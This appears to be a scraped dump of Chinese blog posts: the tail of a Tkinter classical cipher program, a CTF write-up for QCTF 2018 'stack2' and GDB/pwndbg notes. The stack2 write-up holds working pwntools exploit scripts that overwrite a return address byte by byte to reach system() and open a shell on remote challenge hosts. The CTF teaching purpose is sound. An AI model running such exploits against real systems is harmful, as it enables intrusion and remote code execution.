np.zeros((n, n))#临时数组用于降阶 sum = int(0) sign = int(0) p = int(0) if n == 1: return a[0][0] for i in range(n):#此处大循环实现将余子式存入数组b中 for c in range(n-1): for j in range(n-1): if c&lt;i: p = 0#当p=0时，行列式只向左移，即消去对应的第一列的数 else: p = 1#否则行列式左移后再上移 b[c][j]=a[c+p][j+1] if i%2 == 0: sign = 1#i为偶数，加法 else: sign = -1#i为奇数，减法 sum = sum + a[i][0]*Det(b,n-1)*sign#计算行列式的值 return sumdef getAStart(arcs,n,ans):#计算每一行每一列的每个元素所对应的余子式，组成A* if n == 1: ans[0][0] = 1 temp = np.zeros((n, n)) for i in range(n): for j in range(n): for k in range(n-1): for t in range(n-1): temp[k][t] = arcs[(k+1 if k&gt;=i else k)][(t+1 if t&gt;=j else t)] ans[j][i] = Det(temp,n-1) if (i+j)%2 == 1: ans[j][i] = -ans[j][i]def InverseMat(a,n,p,ans): astar = np.zeros((n, n)) getAStart(a, n, astar)#求A的伴随矩阵 deta = int(Det(a,n))#求A的行列式 if deta &lt; 0: deta = deta + p inv = int(InverseElement(deta,p)) for i in range(n): for j in range(n): ans[i][j] = astar[i][j]*inv ans[i][j] = ans[i][j]%p if ans[i][j] &lt;0: ans[i][j] = ans[i][j] + p return ansdef AtoN(A):#处理字符和数字的关系 N = 0 if(ord(A)&gt;=65 and ord(A)&lt;=90): N = ord(A) - ord('A') if (ord(A) &gt;= 97 and ord(A) &lt;= 122): N = ord(A) - ord('a') return Ndef NtoA(N): A = chr(N + ord('A')) return Adef Encrypt(clearlist,A,B,n,N):#加密函数 CipherText = [] lenth = len(clearlist) flag = 0 offset = 0 #补位操作 if(lenth%n == 0): flag = 0 else: flag = 1 offset = n-lenth%n for i in range(offset): clearlist.append('A') groups = int(len(clearlist)/n) for i in range(len(clearlist)): clearlist[i] = AtoN(clearlist[i]) #生成M序列 M = np.ones((groups,n)) index = 0 for row in range(groups): for column in range(n): M[row][column] = clearlist[index] index = index + 1 for i in range(groups):#实现矩阵乘法和矩阵加法，A*M+Bmod(N) tmp = np.zeros((n, 1)) tmpp = np.zeros((n, 1)) for row in range(n):#初始化Mi tmp[row][0] = M[i][row] for row in range(n):#实现A*M for column in range(n): tmpp[row][0] = int(tmpp[row][0] + (int(tmp[column][0]) * int(A[row][column]))) tmpp[row][0] = int((tmpp[row][0]) % N) for row in range(n):#实现+ tmpp[row][0] = (tmpp[row][0] + B[row][0]) % N for row in range(n): CipherText.append(NtoA(int(tmpp[row][0]))) if flag == 1: for i in range(offset):#消除补位影响 del CipherText[-1] return CipherTextdef Decrypt(CipherText,A,B,n,N):#解密函数 clearlist = [] lenth = len(CipherText) flag = 0 offset = 0 # 补位操作 if (lenth % n == 0): flag = 0 else: flag = 1 offset = n - lenth % n for i in range(offset): CipherText.append('A') groups = int(len(CipherText) / n) for i in range(len(CipherText)): CipherText[i] = AtoN(CipherText[i]) # 生成M序列 M = np.zeros((groups, n)) index = 0 for row in range(groups): for column in range(n): M[row][column] = CipherText[index] index = index + 1 #求C-B for i in range(groups):#实现矩阵乘法和矩阵加法，InA*(C-B) tmp = np.zeros((n, 1)) tmpp = np.zeros((n, 1)) for row in range(n):#初始化Mi tmp[row][0] = M[i][row] for row in range(n): # 实现C-B tmp[row][0] = tmp[row][0] - B[row][0] for row in range(n):#实现InA*(C-B)mod(N) for column in range(n): tmpp[row][0] = int(tmpp[row][0] + (int(tmp[column][0]) * int(A[row][column]))) tmpp[row][0] = int((tmpp[row][0]) % N) for row in range(n): clearlist.append(NtoA(int(tmpp[row][0]))) if flag == 1: for i in range(offset):#消除补位影响 del clearlist[-1] return clearlistdef getIdentityMatrix(n):#生成单位矩阵 A = np.zeros((n,n)) for i in range(n): for j in range(n): if i == j: A[i][j] = 1 else: A[i][j] = 0 return Adef getInvertibleMatrix(n,m):#生成可逆矩阵 while 1: A = getIdentityMatrix(n) tempArray = np.zeros(n) B = np.zeros((n,n)) transformTime = int(random.randint(0,1000)) maxint = sys.maxsize for i in range(transformTime): mainRowNum = int((random.randint(0,n) % (n - 1)))#选择一个主行作初等行变换 for k in range(n): #元素数值是否会溢出 if maxint - (A[mainRowNum][k])*(int(random.randint(0,10))) &lt; 0 and maxint*(-1) - (A[mainRowNum][k])*(int(random.randint(0,10))) &gt; tempArray[k]: tempArray[k] = A[mainRowNum][k] else: tempArray[k] = (A[mainRowNum][k]*(int(random.randint(0,10))))%m for j in range(n): if mainRowNum != j: for k in range(n): if maxint - A[j][k]&lt; tempArray[k] and maxint * (-1) - (A[j][k]) &gt; tempArray[k]: A[j][k] = (A[j][k]/4)%m else: A[j][k] = (A[j][k] + tempArray[k])%m if gcd(np.linalg.det(A),m) == 1 and np.linalg.det(A) &gt; 0: break return Adef nnb(): messagebox.showinfo(\"Succesfull\", \"File is in your computer!\")def newwind(n,m): winNew = Toplevel(window) winNew.geometry('320x400') winNew.title('Random Key') lb1 = tk.Label(winNew, text='Random A Key', font=('Arial', 16), width=40, height=2) lb1.pack(fill='x') nt1 = tk.Text(winNew, height=8, width=40) nt1.pack(fill='x') lb2 = tk.Label(winNew, text='Random B Key', font=('Arial', 16), width=40, height=2) lb2.pack(fill='x') nt2 = tk.Text(winNew, height=8, width=40) nt2.pack(fill='x') nb = tk.Button(winNew, text='Save', font=('Arial', 12), width=10, height=1, command=nnb) nb.pack() lb3 = tk.Label(winNew, text='@FZU-IS-404 ZERO-A-ONE', font=('Arial', 10), width=40, height=2) lb3.pack(fill='x') B = np.zeros((n, 1)) A = getInvertibleMatrix(n,m) for row in range(n): B[row] = int(random.randint(0, 26)) At = open('A_key.txt', 'w') Bt = open('B_key.txt', 'w') for row in range(n): str1 = \"\" for line in range(n): str1 += str(int(A[row][line])) str1 += ' ' str1 += \"\\n\" At.write(str1) nt1.insert(\"%d.%d\" % (0, int(row)),str1) At.close() for row in range(n): str2 = \"\" str2 += str(int(A[row][0])) str2 += \"\\n\" Bt.write(str2) nt2.insert(\"%d.%d\" % (0, int(row)), str2) Bt.close()def nb1(): fo = open(\"text.txt\", \"r+\") str = fo.read() tt2.insert(INSERT, str) fo.close()def buttonRK(): if e1.get() != \"\" and e2.get() != \"\": n = int(e1.get()) m = int(e2.get()) newwind(n,m) else: messagebox.showinfo(\"Error\", \"Please input n\")def n2wind(ans,n): n2wind = Toplevel(window) n2wind.geometry('300x130') n2wind.title('Inverse Matrix') n2nt2 = tk.Text(n2wind, height=8, width=40) n2nt2.pack(fill='x') for row in range(n): str1 = \"\" for line in range(n): str1 += str(int(ans[row][line])) str1 += ' ' str1 += \"\\n\" n2nt2.insert(\"%d.%d\" % (0, int(row)),str1)def Dewin():#解密函数GUI if t1.get(\"0.0\",\"end\") != \"\" and t2.get(\"0.0\",\"end\") != \"\" and e1.get() != \"\" and e2.get() != \"\": n = int(e1.get()) m = int(e2.get()) A = np.zeros((n, n)) B = np.zeros((n, 1)) InA = np.zeros((n, n)) Atex = t1.get(\"1.0\", \"end\") stringA = ' '.join(Atex.split()) listA = list(stringA.split(' ')) index = 0 for row in range(n): for column in range(n): A[row][column] = int(listA[index]) index = index + 1 Btex = t2.get(\"1.0\", \"end\") stringB = ' '.join(Btex.split()) listB = list(stringB.split(' ')) index = 0 for row in range(n): B[row][0] = int(listB[index]) index = index + 1 clear = tt2.get(\"1.0\", \"end\") clear = list(clear) InA = InverseMat(A, n, m, InA) klist = np.zeros(len(clear)) index = 0 for i in range(len(clear)): if clear[i] == ' ': klist[index] = int(i) index = index + 1 dlist = np.zeros(len(clear)) index = 0 for i in range(len(clear)): if clear[i] == ',': dlist[index] = int(i) index = index + 1 for i in range(len(clear)): if clear[i] == ',': clear[i] = ' ' while ' ' in clear: clear.remove(' ') print(dlist) print(klist) clearlist = Decrypt(clear, InA, B, n, m) print(clearlist) clearlist = list(clearlist) for i in range(len(klist)): if klist[i] == 0: break ind = int(klist[i]) clearlist.insert(ind, \" \") for i in range(len(dlist)): if dlist[i] == 0: break ind = int(dlist[i]) clearlist.insert(ind, \",\") str = \"\" for i in range(len(clearlist)): str += clearlist[i] t3.insert(INSERT, str) n2wind(InA,n) else: messagebox.showinfo(\"Error\", \"Please input n,m,A key,B key\")def Enwin():#加密函数GUI if t1.get(\"0.0\",\"end\") != \"\" and t2.get(\"0.0\",\"end\") != \"\" and e1.get() != \"\" and e2.get() != \"\": n = int(e1.get()) m = int(e2.get()) A = np.zeros((n, n)) B = np.zeros((n, 1)) Atex = t1.get(\"1.0\", \"end\") stringA = ' '.join(Atex.split()) listA = list(stringA.split(' ')) index = 0 for row in range(n): for column in range(n): A[row][column] = int(listA[index]) index = index + 1 print(A) Btex = t2.get(\"1.0\", \"end\") stringB = ' '.join(Btex.split()) listB = list(stringB.split(' ')) index = 0 for row in range(n): B[row][0] = int(listB[index]) index = index + 1 print(B) clear = tt2.get(\"1.0\", \"end\") clear = list(clear) klist = np.zeros(len(clear)) index = 0 for i in range(len(clear)): if clear[i] == ' ': klist[index] = int(i) index = index + 1 dlist = np.zeros(len(clear)) index = 0 for i in range(len(clear)): if clear[i] == ',': dlist[index] = int(i) index = index + 1 print(dlist) print(klist) for i in range(len(clear)): if clear[i] == ',': clear[i] = ' ' while ' ' in clear: clear.remove(' ') CipherText = Encrypt(clear,A,B,n,m) print(CipherText) CipherText = list(CipherText) print(CipherText) for i in range(len(klist)): if klist[i] == 0: break ind = int(klist[i]) CipherText.insert(ind,\" \") for i in range(len(dlist)): if dlist[i] == 0: break ind = int(dlist[i]) CipherText.insert(ind,\",\") str = \"\" for i in range(len(CipherText)): str += CipherText[i] t3.insert(INSERT,str) else: messagebox.showinfo(\"Error\", \"Please input n,m,A key,B key\")if __name__ == '__main__': #主窗口 window = tk.Tk() window.title('Multi-table') window.geometry('300x950') #随机密钥 b = tk.Button(window, text='Random Key', font=('Arial', 12), width=10, height=1,command=buttonRK) b.pack() # 2标签 l2 = tk.Label(window, text='Please input n', font=('Arial', 16), width=40, height=2) l2.pack(fill='x') # 输入框控件entry e1 = tk.Entry(window, show=None, width=8,justify = 'center') # 显示成明文形式 e1.pack() # 3标签 l3 = tk.Label(window, text='Please input M', font=('Arial', 16), width=40, height=2) l3.pack(fill='x') # 输入框控件entry e2 = tk.Entry(window, show=None, width=8, justify='center') # 显示成明文形式 e2.pack() #4标签 l4 = tk.Label(window, text='A Key', font=('Arial', 16), width=40, height=2) l4.pack(fill='x') #Text t1 = tk.Text(window, height=8,width = 40) t1.pack(fill='x') #5标签 l5 = tk.Label(window, text='B Key', font=('Arial', 16), width=40, height=2) l5.pack(fill='x') # Text t2 = tk.Text(window, height=8, width=40) t2.pack(fill='x') # 5标签 ll5 = tk.Label(window, text='Text', font=('Arial', 16), width=20, height=2) ll5.pack(fill='x') # Text tt2 = tk.Text(window, height=8, width=20) tt2.pack(fill='x') b1 = tk.Button(window, text='File', font=('Arial', 12), width=10, height=1, command=nb1) b1.pack() # 加密 De = tk.Button(window, text='Decrypt', font=('Arial', 12), width=10, height=1,command=Dewin) De.pack() # 解密 En = tk.Button(window, text='Encrypt', font=('Arial', 12), width=10, height=1,command=Enwin) En.pack() # 6标签 l6 = tk.Label(window, text='SOLUTION', font=('Arial', 16), width=20, height=2) l6.pack(fill='x') # Text t3 = tk.Text(window, height=8, width=20) t3.pack(fill='x') # 8标签 l8 = tk.Label(window, text='@FZU-IS-404 ZERO-A-ONE', font=('Arial', 10), width=40, height=2) l8.pack(fill='x') window.mainloop() 重要的实现细节GUI界面的实现GUI界面的实现极大的方便了使用者的使用体验，降低了使用门槛，使得本程序的实用化程度大大提升 三目运算符的使用在求A的伴随矩阵时，使用了三目运算符，简化了程序，使思路更清晰 1temp[k][t] = arcs[(k+1 if k&gt;=i else k)][(t+1 if t&gt;=j else t)] 随机生成在模下可逆矩阵通过模拟初等变换实现的可逆矩阵，更重要的是保证了矩阵A的行列式与所定模N互素。且在随机化的过程中，通过判断保证了数据不会溢出 1if maxint - (A[mainRowNum][k])*(int(random.randint(0,10))) &lt; 0 and maxint*(-1) - (A[mainRowNum][k])*(int(random.randint(0,10))) &gt; tempArray[k]: ` 实现效果主界面 随机矩阵生成 逆矩阵 例题加密 例题解密 总结多表代换密码为古典密码学中一种较为经典的加密方式，对于多表替换加密来说，加密后的字母几乎不再保持原来的频率，对于词频和字频分析有了一定的抵抗能力 本人的系统有如下亮点： 实现了全部的GUI可视化操作 实现了对长度不是n的倍数的明文的处理，能够对长度不是n的倍数的明文进行加密解密 实现了对空格和标点符号的处理。要求解密时能还原空格和标点符号 实现了对文件的读写操作 实现了调用系统API实现错误弹窗功能","categories":[],"tags":[]},{"title":"4th-QCTF-2018-stack2","slug":"4th-QCTF-2018-stack2","date":"2019-09-05T14:34:31.000Z","updated":"2019-09-06T05:35:04.000Z","comments":true,"path":"2019/09/05/4th-QCTF-2018-stack2/","link":"","permalink":"http://yoursite.com/2019/09/05/4th-QCTF-2018-stack2/","excerpt":"","text":"一道常规的通过栈溢出控制EIP从而改变程序path的题目 先检查一下获得的文件 12345Arch: i386-32-littleRELRO: Partial RELROStack: Canary foundNX: NX enabledPIE: No PIE (0x8048000) 可知开启了NX和Canary防护，我们运行一下这个程序 1234567891011121314151617181920212223************************************************************ An easy calc **Give me your numbers and I will return to you an average **(0 &lt;= x &lt; 256) ************************************************************How many numbers you have:10Give me your numbers123456789101. show numbers2. add number3. change number4. get average5. exit 大概就是一个求平均数的程序，我们用IDA Pro看一下反汇编代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475int __cdecl main(int argc, const char **argv, const char **envp)&#123; int v3; // eax unsigned int v5; // [esp+18h] [ebp-90h] unsigned int v6; // [esp+1Ch] [ebp-8Ch] int v7; // [esp+20h] [ebp-88h] unsigned int j; // [esp+24h] [ebp-84h] int v9; // [esp+28h] [ebp-80h] unsigned int i; // [esp+2Ch] [ebp-7Ch] unsigned int k; // [esp+30h] [ebp-78h] unsigned int l; // [esp+34h] [ebp-74h] char v13[100]; // [esp+38h] [ebp-70h] unsigned int v14; // [esp+9Ch] [ebp-Ch] v14 = __readgsdword(0x14u); setvbuf(stdin, 0, 2, 0); setvbuf(stdout, 0, 2, 0); v9 = 0; puts(\"***********************************************************\"); puts(\"* An easy calc *\"); puts(\"*Give me your numbers and I will return to you an average *\"); puts(\"*(0 &lt;= x &lt; 256) *\"); puts(\"***********************************************************\"); puts(\"How many numbers you have:\"); __isoc99_scanf(\"%d\", &amp;v5); puts(\"Give me your numbers\"); for ( i = 0; i &lt; v5 &amp;&amp; (signed int)i &lt;= 99; ++i ) &#123; __isoc99_scanf(\"%d\", &amp;v7); v13[i] = v7; &#125; for ( j = v5; ; printf(\"average is %.2lf\\n\", (double)((long double)v9 / (double)j)) ) &#123; while ( 1 ) &#123; while ( 1 ) &#123; while ( 1 ) &#123; puts(\"1. show numbers\\n2. add number\\n3. change number\\n4. get average\\n5. exit\"); __isoc99_scanf(\"%d\", &amp;v6); if ( v6 != 2 ) break; puts(\"Give me your number\"); __isoc99_scanf(\"%d\", &amp;v7); if ( j &lt;= 0x63 ) &#123; v3 = j++; v13[v3] = v7; &#125; &#125; if ( v6 &gt; 2 ) break; if ( v6 != 1 ) return 0; puts(\"id\\t\\tnumber\"); for ( k = 0; k &lt; j; ++k ) printf(\"%d\\t\\t%d\\n\", k, v13[k]); &#125; if ( v6 != 3 ) break; puts(\"which number to change:\"); __isoc99_scanf(\"%d\", &amp;v5); puts(\"new number:\"); __isoc99_scanf(\"%d\", &amp;v7); v13[v5] = v7; &#125; if ( v6 != 4 ) break; v9 = 0; for ( l = 0; l &lt; j; ++l ) v9 += v13[l]; &#125; return 0;&#125; 毫无头绪，我们先尝试搜索一下flag，sysytem，cat等常用字符串，看看能不能寻找到什么有用的线索，我们发现了hackhere函数 123456789101112131415161718192021.text:0804859B public hackhere.text:0804859B hackhere proc near.text:0804859B.text:0804859B var_C = dword ptr -0Ch.text:0804859B.text:0804859B ; __unwind &#123;.text:0804859B push ebp.text:0804859C mov ebp, esp.text:0804859E sub esp, 18h.text:080485A1 mov eax, large gs:14h.text:080485A7 mov [ebp+var_C], eax.text:080485AA xor eax, eax.text:080485AC sub esp, 0Ch.text:080485AF push offset command ; &quot;/bin/bash&quot;.text:080485B4 call _system.text:080485B9 add esp, 10h.text:080485BC nop.text:080485BD mov edx, [ebp+var_C].text:080485C0 xor edx, large gs:14h.text:080485C7 jz short locret_80485CE.text:080485C9 call ___stack_chk_fail 1234int hackhere()&#123; return system(\"/bin/bash\");&#125; 我们现在大概有思路了，就是通过栈溢出控制程序的path到这个函数上就可以查看到flag了，现在来分析程序，可以看到两个溢出点 12345for ( i = 0; i &lt; v5 &amp;&amp; (signed int)i &lt;= 99; ++i ) &#123; __isoc99_scanf(\"%d\", &amp;v7); v13[i] = v7; &#125; 123puts(\"new number:\"); __isoc99_scanf(\"%d\", &amp;v7); v13[v5] = v7; 我们可以知道第一个溢出点是没有什么作用的，然后看看第二个溢出点，这里就是bug了，因为我们没有检查v13数组的边界，这里我们可以随意输入，然后劫持程序EIP，问题是这里的v13是char类型的数组，在32位系统中，一个char类型占用一个1字节，而地址是以int类型存储的，在32位系统中占用4字节，等于说我们需要把地址拆分成4个字节输入 我们知道我们需要达到的地址是：0x080485AF，在Linux中数据的存储的小端序结构，所以我们需要把这串地址反着拆成两个两个一组的组合：0xAF、0x85、0x04、0x08 这题的溢出点如果不是用pattern.py脚本计算而是手动计算的话有点小坑，我们的目标是修改main函数的返回地址到0x080485AF，所以我们需要找到存放main函数返回地址的内存与字符串数组内存的偏移量 我们注意到main函数开头和结尾的汇编代码 开头 .text:080485D0 lea ecx, [esp+4] 结尾 12.text:080488EF lea esp, [ecx-4].text:080488F2 retn 可以知道最后main函数的返回值，是由esp决定的，而最后esp的值又是由ecx的值决定的，而ecx的值是由一开始esp的值决定的。由于我们通过静态分析，无法得知一开始时esp的内存位置，故当最后返回地址时esp的值我们也无法确定，我们需要通过动态调试才能得知一开始时esp的内存地址和最后返回的地址，计算得出偏移 0xFFFFCEF8是数组的地址，0xFFFFCF7C是存放main函数返回地址，故pwndbg&gt; p/x 0xffffcf7c-0xffffcef8 $1 = 0x84，可以得出偏移量（溢出点）为0x84 所以Exploit为 12345678910111213141516171819202122232425#!/usr/bin/python#coding:utf-8from pwn import*system_addr=0x080485AFleave_offset=0x84 def write_addr(addr,va): io.sendline(\"3\") io.recvuntil(\"which number to change:\\n\") io.sendline(str(addr)) io.recvuntil(\"new number:\\n\") io.sendline(str(va)) io.recvuntil(\"5. exit\\n\") io=remote('111.198.29.45','31725')io.recvuntil(\"How many numbers you have:\\n\")io.sendline(\"1\")io.recvuntil(\"Give me your numbers\\n\")io.sendline(\"1\")io.recvuntil(\"5. exit\\n\")# write system_addrwrite_addr(leave_offset,0XAF)write_addr(leave_offset+1,0X85)write_addr(leave_offset+2,0X04)write_addr(leave_offset+3,0X08)io.sendline(\"5\")io.interactive() 这个题有个坑点在于题目给出了getshell的函数，但是出题人在搭建docker环境时未注意，环境中只给了sh，在发现问题后考虑到题目依然可解就未再次更改环境。题目依然是简单的栈溢出，只不过不能直接跳转到getshell，需要简单的ROP一下，我们只需要找到system函数的调用地址和bin/sh的字符串地址即可 最终的Exploit为 1234567891011121314151617181920212223242526272829303132#!/usr/bin/python#coding:utf-8from pwn import*system_addr=0x080485AFleave_offset=0x84def write_addr(addr,va): io.sendline(\"3\") io.recvuntil(\"which number to change:\\n\") io.sendline(str(addr)) io.recvuntil(\"new number:\\n\") io.sendline(str(va)) io.recvuntil(\"5. exit\\n\")io=remote('111.198.29.45','31725')io.recvuntil(\"How many numbers you have:\\n\")io.sendline(\"1\")io.recvuntil(\"Give me your numbers\\n\")io.sendline(\"1\")io.recvuntil(\"5. exit\\n\")# write system_addr 0x08048450write_addr(leave_offset,0X50)write_addr(leave_offset+1,0X84)write_addr(leave_offset+2,0X04)write_addr(leave_offset+3,0X08)# sh_addr 0x08048987leave_offset+=8print leave_offsetwrite_addr(leave_offset,0x87)write_addr(leave_offset+1,0X89)write_addr(leave_offset+2,0X04)write_addr(leave_offset+3,0X08)io.sendline(\"5\")io.interactive() 或者 1234567891011121314151617181920212223242526272829303132333435363738from pwn import *g_local=Truecontext.log_level='debug'if g_local: sh = process('./stack2')#env=&#123;'LD_PRELOAD':'./libc.so.6'&#125; gdb.attach(sh)else: sh = remote(\"47.96.239.28\", 2333)def write_byte(off, val): sh.send(\"3\\n\") sh.recvuntil(\"which number to change:\\n\") sh.send(str(off) + \"\\n\") sh.recvuntil(\"new number:\\n\") sh.send(str(val) + \"\\n\") sh.recvuntil(\"5. exit\\n\")def write_dword(off, val): write_byte(off, val &amp; 0xff) write_byte(off + 1, (val &gt;&gt; 8) &amp; 0xff) write_byte(off + 2, (val &gt;&gt; 16) &amp; 0xff) write_byte(off + 3, (val &gt;&gt; 24) &amp; 0xff)def exit(): sh.send(\"5\\n\") sh.interactive()sh.recvuntil(\"How many numbers you have:\\n\")sh.send(\"1\\n\")sh.recvuntil(\"Give me your numbers\\n\")sh.send(\"1\\n\")sh.recvuntil(\"5. exit\\n\")write_dword(0x84, 0x8048450)write_dword(0x8C, 0x8048980 + 7)exit()","categories":[],"tags":[]},{"title":"GDB笔记","slug":"GDB▒╩╝╟","date":"2019-09-04T14:05:55.000Z","updated":"2019-09-05T05:06:22.000Z","comments":true,"path":"2019/09/04/GDB▒╩╝╟/","link":"","permalink":"http://yoursite.com/2019/09/04/GDB▒╩╝╟/","excerpt":"","text":"查看内存vmmap查看程序地址布局 1234567891011121314151617181920pwndbg&gt; vmmapLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA 0x55af2b74c000 0x55af2b74d000 r-xp 1000 0 /mnt/hgfs/shared/xman/first/pwn/dicegame/dice_game 0x55af2b94d000 0x55af2b94e000 r--p 1000 1000 /mnt/hgfs/shared/xman/first/pwn/dicegame/dice_game 0x55af2b94e000 0x55af2b94f000 rw-p 1000 2000 /mnt/hgfs/shared/xman/first/pwn/dicegame/dice_game 0x55af2bfe7000 0x55af2c008000 rw-p 21000 0 [heap] 0x7eff0e064000 0x7eff0e224000 r-xp 1c0000 0 /lib/x86_64-linux-gnu/libc-2.23.so 0x7eff0e224000 0x7eff0e424000 ---p 200000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so 0x7eff0e424000 0x7eff0e428000 r--p 4000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so 0x7eff0e428000 0x7eff0e42a000 rw-p 2000 1c4000 /lib/x86_64-linux-gnu/libc-2.23.so 0x7eff0e42a000 0x7eff0e42e000 rw-p 4000 0 0x7eff0e42e000 0x7eff0e454000 r-xp 26000 0 /lib/x86_64-linux-gnu/ld-2.23.so 0x7eff0e635000 0x7eff0e638000 rw-p 3000 0 0x7eff0e653000 0x7eff0e654000 r--p 1000 25000 /lib/x86_64-linux-gnu/ld-2.23.so 0x7eff0e654000 0x7eff0e655000 rw-p 1000 26000 /lib/x86_64-linux-gnu/ld-2.23.so 0x7eff0e655000 0x7eff0e656000 rw-p 1000 0 0x7fffcce94000 0x7fffcceb5000 rw-p 21000 0 [stack] 0x7fffccef0000 0x7fffccef3000 r--p 3000 0 [vvar] 0x7fffccef3000 0x7fffccef5000 r-xp 2000 0 [vdso]0xffffffffff600000 0xffffffffff601000 r-xp 1000 0 [vsyscall] telescopetelescope [addr] [count] 123456789101112131415161718192021222324252627282930313233343536373839pwndbg&gt; telescope 00:0000│ rsp 0x7fffcceb26e8 —▸ 0x55af2b74cbfc ◂— mov qword ptr [rbp - 0x18], rax01:0008│ rsi 0x7fffcceb26f0 ◂— 0x0... ↓07:0038│ 0x7fffcceb2720 —▸ 0x55af2b74ccd0 ◂— push r15pwndbg&gt; telescope 0x7fffcceb26e8 3000:0000│ rsp 0x7fffcceb26e8 —▸ 0x55af2b74cbfc ◂— mov qword ptr [rbp - 0x18], rax01:0008│ rsi 0x7fffcceb26f0 ◂— 0x0... ↓07:0038│ 0x7fffcceb2720 —▸ 0x55af2b74ccd0 ◂— push r1508:0040│ 0x7fffcceb2728 —▸ 0x55af2b74c8f0 ◂— xor ebp, ebp09:0048│ 0x7fffcceb2730 ◂— 0x5d6df5a30a:0050│ 0x7fffcceb2738 ◂— 0x00b:0058│ rbp 0x7fffcceb2740 —▸ 0x55af2b74ccd0 ◂— push r150c:0060│ 0x7fffcceb2748 —▸ 0x7eff0e084830 (__libc_start_main+240) ◂— mov edi, eax0d:0068│ 0x7fffcceb2750 ◂— 0x10e:0070│ 0x7fffcceb2758 —▸ 0x7fffcceb2828 —▸ 0x7fffcceb4208 ◂— 'dice_game'0f:0078│ 0x7fffcceb2760 ◂— 0x10e653ca010:0080│ 0x7fffcceb2768 —▸ 0x55af2b74cb99 ◂— push rbp11:0088│ 0x7fffcceb2770 ◂— 0x012:0090│ 0x7fffcceb2778 ◂— 0x8904a58936d20a6713:0098│ 0x7fffcceb2780 —▸ 0x55af2b74c8f0 ◂— xor ebp, ebp14:00a0│ 0x7fffcceb2788 —▸ 0x7fffcceb2820 ◂— 0x115:00a8│ 0x7fffcceb2790 ◂— 0x0... ↓17:00b8│ 0x7fffcceb27a0 ◂— 0xdda56ab6e1d20a6718:00c0│ 0x7fffcceb27a8 ◂— 0xdfa4ef7020a20a6719:00c8│ 0x7fffcceb27b0 ◂— 0x0... ↓1c:00e0│ 0x7fffcceb27c8 —▸ 0x7fffcceb2838 —▸ 0x7fffcceb4212 ◂— 0x505f4150515f5451 ('QT_QPA_P')1d:00e8│ 0x7fffcceb27d0 —▸ 0x7eff0e655168 —▸ 0x55af2b74c000 ◂— jg 0x55af2b74c047pwndbg&gt; telescope 0x7fffcceb26e8 00:0000│ rsp 0x7fffcceb26e8 —▸ 0x55af2b74cbfc ◂— mov qword ptr [rbp - 0x18], rax01:0008│ rsi 0x7fffcceb26f0 ◂— 0x0... ↓07:0038│ 0x7fffcceb2720 —▸ 0x55af2b74ccd0 ◂— push r15 x格式：x/&lt;n/f/u&gt; n:是正整数，表示需要显示的内存单元的个数，即从当前地址向后显示n个内存单元的内容，一个内存单元的大小由第三个参数u定义。 f:表示addr指向的内存内容的输出格式，s对应输出字符串，此处需特别注意输出整型数据的格式： x 按十六进制格式显示变量。 d 按十进制格式显示变量。 u 按十六进制格式显示无符号整型。 o 按八进制格式显示变量。 t 按二进制格式显示变量。 a 按十六进制格式显示变量。 c 按字符格式显示变量。 f 按浮点数格式显示变量。 u:就是指以多少个字节作为一个内存单元-unit,默认为4。当然u还可以用被一些字符表示，如b=1 byte, h=2 bytes,w=4 bytes,g=8 bytes 示例: 12345678910111213141516171819202122pwndbg&gt; x/10wx 0x7fffcceb26e80x7fffcceb26e8: 0x2b74cbfc 0x000055af 0x00000000 0x000000000x7fffcceb26f8: 0x00000000 0x00000000 0x00000000 0x000000000x7fffcceb2708: 0x00000000 0x00000000pwndbg&gt; x/10gx 0x7fffcceb26e80x7fffcceb26e8: 0x000055af2b74cbfc 0x00000000000000000x7fffcceb26f8: 0x0000000000000000 0x00000000000000000x7fffcceb2708: 0x0000000000000000 0x00000000000000000x7fffcceb2718: 0x0000000000000000 0x000055af2b74ccd00x7fffcceb2728: 0x000055af2b74c8f0 0x000000005d6df5a3pwndbg&gt; x/10bx 0x7fffcceb26e80x7fffcceb26e8: 0xfc 0xcb 0x74 0x2b 0xaf 0x55 0x00 0x000x7fffcceb26f0: 0x00 0x00pwndbg&gt; x/10hx 0x7fffcceb26e80x7fffcceb26e8: 0xcbfc 0x2b74 0x55af 0x0000 0x0000 0x0000 0x0000 0x00000x7fffcceb26f8: 0x0000 0x0000pwndbg&gt; x/10b 0x7fffcceb26e80x7fffcceb26e8: 0xfc 0xcb 0x74 0x2b 0xaf 0x55 0x00 0x000x7fffcceb26f0: 0x00 0x00pwndbg&gt; x/10c 0x7fffcceb26e80x7fffcceb26e8: -4 '\\374' -53 '\\313' 116 't' 43 '+' -81 '\\257' 85 'U' 0 '\\000' 0 '\\000'0x7fffcceb26f0: 0 '\\000' 0 '\\000' heap显示堆的情况 bins显示堆的分配情况 stackstack [count]显示栈的情况 下断点b直接输入b会把断点下在当前rip或者eip的位置 12345678910111213141516171819202122232425262728RIP 0x7ffff7b04260 (__read_nocancel+7) ◂— cmp rax, -0xfff───────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────── ► 0x7ffff7b04260 &lt;__read_nocancel+7&gt; cmp rax, -0xfff 0x7ffff7b04266 &lt;__read_nocancel+13&gt; jae read+73 &lt;0x7ffff7b04299&gt; ↓ 0x7ffff7b04299 &lt;read+73&gt; mov rcx, qword ptr [rip + 0x2ccbd8] 0x7ffff7b042a0 &lt;read+80&gt; neg eax 0x7ffff7b042a2 &lt;read+82&gt; mov dword ptr fs:[rcx], eax 0x7ffff7b042a5 &lt;read+85&gt; or rax, 0xffffffffffffffff 0x7ffff7b042a9 &lt;read+89&gt; ret 0x7ffff7b042aa nop word ptr [rax + rax] 0x7ffff7b042b0 &lt;write&gt; cmp dword ptr [rip + 0x2d2489], 0 &lt;0x7ffff7dd6740&gt; 0x7ffff7b042b7 &lt;write+7&gt; jne write+25 &lt;0x7ffff7b042c9&gt; ↓ 0x7ffff7b042c9 &lt;write+25&gt; sub rsp, 8────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────00:0000│ rsp 0x7fffffffdce8 —▸ 0x555555554bfc ◂— mov qword ptr [rbp - 0x18], rax01:0008│ rsi 0x7fffffffdcf0 ◂— 0x0... ↓07:0038│ 0x7fffffffdd20 —▸ 0x555555554cd0 ◂— push r15──────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────── ► f 0 7ffff7b04260 __read_nocancel+7 f 1 555555554bfc f 2 